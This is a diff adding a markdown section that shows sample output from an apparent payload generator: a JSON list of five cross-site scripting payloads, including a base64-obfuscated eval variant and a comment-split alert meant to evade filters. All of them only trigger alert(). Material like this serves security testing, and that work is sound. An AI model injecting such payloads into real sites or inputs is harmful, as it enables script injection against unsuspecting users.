@@ -1,0 +1,11 @@
+### Sample Payload Outputs
+
+**xss_payloads.json:**
+```json
+[
+  "<script>alert('XSS')</script>",
+  "<img src=x onerror=alert(1)>",
+  "<svg onload=alert(1)>",
+  "<img src=x:g onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
+  "<script>/*!*/alert/*!*/(1)</script>"
+]
